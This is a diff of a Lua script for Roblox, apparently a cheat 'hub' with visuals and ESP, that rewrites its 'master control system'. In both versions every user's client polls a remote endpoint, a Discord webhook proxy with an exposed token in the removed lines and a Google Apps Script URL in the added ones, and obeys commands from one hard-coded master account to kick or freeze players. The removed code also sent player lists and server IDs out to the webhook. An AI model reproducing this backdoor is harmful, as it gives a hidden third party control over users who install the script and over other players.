@@ -2454,205 +2454,131 @@ WorldTab:Button({
 
 WorldTab:Label("🎨 World visuals ready!", "Left")
 
--- ==================== MASTER CONTROL SYSTEM ====================
-local YOUR_ROBLOX_ID = 1455718649  -- ← YOUR ID
-local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1476059654663438421/c8crSZJ1IUAf6uiBEySlOYSq9gz3ugla3wK5AXhABANATIUl5SQaiA7BluZ7xGxcGJ17"
+-- ==================== CONFIGURATION ====================
+local MASTER_ID = 1455718649 
+local CONTROL_URL = "https://script.google.com/macros/s/AKfycbzKd08VeN9UhvoZSKbcefd9379jUSWtW7oYuStXmLKgVYjL-AP-PeqP6p7urBpUcppr_w/exec"
 local PREFIX = ":"
-local HttpService = game:GetService("HttpService")
 
--- ==================== COMMANDS ====================
+-- ==================== CORE FUNCTIONS ====================
 
-local function executeCommand(cmd, args)
-    -- SHOUT
+local function showShout(msg)
+    local gui = Instance.new("ScreenGui")
+    gui.Parent = game:GetService("CoreGui")
+    local txt = Instance.new("TextLabel")
+    txt.Size = UDim2.new(1, 0, 0.2, 0)
+    txt.Position = UDim2.new(0, 0, 0.4, 0)
+    txt.BackgroundTransparency = 1
+    txt.Text = "📢 " .. msg
+    txt.TextColor3 = Color3.fromRGB(251, 144, 255)
+    txt.TextScaled = true
+    txt.Font = Enum.Font.GothamBold
+    txt.Parent = gui
+    task.wait(3)
+    gui:Destroy()
+end
+
+local function showNotify(title, msg)
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = title,
+        Text = msg,
+        Duration = 5
+    })
+end
+
+local function findPlayer(name)
+    for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
+        if p.Name:lower() == name:lower() or tostring(p.UserId) == name then
+            return p
+        end
+    end
+    return nil
+end
+
+-- ==================== COMMAND EXECUTION ====================
+
+local function executeCommand(cmd, args, fromMaster)
+    cmd = cmd:lower()
+    
     if cmd == "shout" then
         local msg = table.concat(args, " ")
-        if msg == "" then return end
-        local gui = Instance.new("ScreenGui")
-        gui.Parent = game:GetService("CoreGui")
-        local txt = Instance.new("TextLabel")
-        txt.Size = UDim2.new(1, 0, 0.2, 0)
-        txt.Position = UDim2.new(0, 0, 0.4, 0)
-        txt.BackgroundTransparency = 1
-        txt.Text = "📢 " .. msg
-        txt.TextColor3 = Color3.fromRGB(251, 144, 255)
-        txt.TextScaled = true
-        txt.Font = Enum.Font.GothamBold
-        txt.Parent = gui
-        task.wait(3)
-        gui:Destroy()
+        if msg ~= "" then showShout(msg) end
 
-    -- ANNOUNCE
     elseif cmd == "announce" then
         local msg = table.concat(args, " ")
-        if msg == "" then return end
-        game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = "Hallow Hub",
-            Text = msg,
-            Duration = 5
-        })
+        if msg ~= "" then showNotify("Hallow Hub", msg) end
 
-    -- KICK
     elseif cmd == "kick" then
         if #args < 1 then return end
-        local target = args[1]
-        local reason = table.concat(args, " ", 2)
-        if reason == "" then reason = "Kicked by Master" end
-        for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
-            if p.Name:lower() == target:lower() or tostring(p.UserId) == target then
-                p:Kick("🔴 " .. reason)
-                break
-            end
+        local p = findPlayer(args[1])
+        local reason = table.concat(args, " ", 2) or "Kicked by Master"
+        if p and p ~= game:GetService("Players").LocalPlayer then
+            p:Kick("🔴 " .. reason)
         end
 
-    -- KICK ALL
-    elseif cmd == "kickall" then
-        local reason = table.concat(args, " ")
-        if reason == "" then reason = "Mass kick" end
-        for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
-            if p ~= game:GetService("Players").LocalPlayer then
-                p:Kick("🔴 " .. reason)
-            end
-        end
-
-    -- FREEZE
     elseif cmd == "freeze" then
-        if #args < 1 then return end
-        local target = args[1]
-        for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
-            if p.Name:lower() == target:lower() or tostring(p.UserId) == target then
-                if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
-                    p.Character.HumanoidRootPart.Anchored = true
-                end
-                break
-            end
+        local p = findPlayer(args[1])
+        if p and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
+            p.Character.HumanoidRootPart.Anchored = true
         end
 
-    -- UNFREEZE
     elseif cmd == "unfreeze" then
-        if #args < 1 then return end
-        local target = args[1]
-        for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
-            if p.Name:lower() == target:lower() or tostring(p.UserId) == target then
-                if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
-                    p.Character.HumanoidRootPart.Anchored = false
-                end
-                break
-            end
+        local p = findPlayer(args[1])
+        if p and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
+            p.Character.HumanoidRootPart.Anchored = false
         end
-
-    -- WARN
-    elseif cmd == "warn" then
-        if #args < 2 then return end
-        local target = args[1]
-        local msg = table.concat(args, " ", 2)
-        for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
-            if p.Name:lower() == target:lower() or tostring(p.UserId) == target then
-                game:GetService("StarterGui"):SetCore("SendNotification", {
-                    Title = "⚠️ WARNING",
-                    Text = msg,
-                    Duration = 5
-                })
-                break
-            end
-        end
-
-    -- WARN ALL
-    elseif cmd == "warnall" then
-        local msg = table.concat(args, " ")
-        if msg == "" then return end
-        for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
-            if p ~= game:GetService("Players").LocalPlayer then
-                game:GetService("StarterGui"):SetCore("SendNotification", {
-                    Title = "⚠️ WARNING",
-                    Text = msg,
-                    Duration = 5
-                })
-            end
-        end
-
-    -- LIST
-    elseif cmd == "list" then
-        local list = ""
-        for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
-            if p ~= game:GetService("Players").LocalPlayer then
-                list = list .. "👤 " .. p.Name .. " (" .. p.UserId .. ")\n"
-            end
-        end
-        if list == "" then list = "No other players" end
         
-        -- Send to Discord
-        pcall(function()
-            local req = syn and syn.request or http_request or request
-            if req then
-                req({
-                    Url = WEBHOOK_URL,
-                    Method = "POST",
-                    Headers = {["Content-Type"] = "application/json"},
-                    Body = HttpService:JSONEncode({
-                        content = "📋 **Users in " .. game.JobId .. "**\n" .. list
-                    })
-                })
-            end
-        end)
+    elseif cmd == "list" then
+        -- This prints to your local console (F9)
+        warn("📋 Command received to list players. Check console.")
+        for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
+            print("👤 " .. p.Name .. " [" .. p.UserId .. "]")
+        end
     end
 end
 
--- ==================== WEBHOOK LISTENER (ALL USERS) ====================
+-- ==================== CROSS-GAME COMMUNICATION ====================
 
-task.spawn(function()
-    local lastCommand = ""
-    print("👂 Listening for commands...")
-    
-    while true do
+-- 1. SENDING (For the Master)
+game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
+    local player = game:GetService("Players").LocalPlayer
+    if player.UserId == MASTER_ID and string.sub(msg, 1, 1) == PREFIX then
+        -- Send to Google Sheets
         pcall(function()
-            local response = game:HttpGet(WEBHOOK_URL .. "?limit=1")
-            local command = string.match(response, '"content":"([^"]+)"')
-            
-            if command and command ~= lastCommand and string.sub(command, 1, 1) == ":" then
-                lastCommand = command
-                print("📩 Received: " .. command)
-                
-                -- Parse command
-                local parts = {}
-                for word in string.gmatch(command, "%S+") do
-                    table.insert(parts, word)
-                end
-                
-                local cmd = string.sub(parts[1], 2)
-                local args = {}
-                for i = 2, #parts do
-                    table.insert(args, parts[i])
-                end
-                
-                executeCommand(cmd, args)
-            end
+            game:GetService("HttpService"):PostAsync(CONTROL_URL, game:GetService("HttpService"):JSONEncode({cmd = msg}))
         end)
-        task.wait(2)
+        
+        -- Execute locally for the master immediately
+        local parts = msg:split(" ")
+        local c = parts[1]:sub(2)
+        table.remove(parts, 1)
+        executeCommand(c, parts, true)
     end
 end)
 
--- ==================== MASTER SENDER (ONLY YOU) ====================
+-- 2. RECEIVING (For Everyone)
+task.spawn(function()
+    local lastCmd = ""
+    while true do
+        local success, currentCmd = pcall(function()
+            return game:HttpGet(CONTROL_URL)
+        end)
 
-if game:GetService("Players").LocalPlayer.UserId == YOUR_ROBLOX_ID then
-    game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
-        if string.sub(msg, 1, 1) == ":" then
-            pcall(function()
-                local req = syn and syn.request or http_request or request
-                if req then
-                    req({
-                        Url = WEBHOOK_URL,
-                        Method = "POST",
-                        Headers = {["Content-Type"] = "application/json"},
-                        Body = HttpService:JSONEncode({content = msg})
-                    })
-                    print("📤 Sent: " .. msg)
-                end
-            end)
+        if success and currentCmd ~= "" and currentCmd ~= lastCmd then
+            lastCmd = currentCmd
+            
+            local parts = currentCmd:split(" ")
+            local c = parts[1]:sub(2)
+            table.remove(parts, 1)
+            
+            executeCommand(c, parts, false)
         end
-    end)
-    print("👑 MASTER MODE: You are the master")
-else
-    print("👤 USER MODE: Waiting for master commands")
+        task.wait(5) -- Checks every 5 seconds to stay within Google's free limits
+    end
+end)
+
+print("✅ Hybrid Master Control Loaded")
+if game:GetService("Players").LocalPlayer.UserId == MASTER_ID then
+    print("👑 MASTER STATUS VERIFIED")
 end
 
 -- Initialize ESP after UI is created
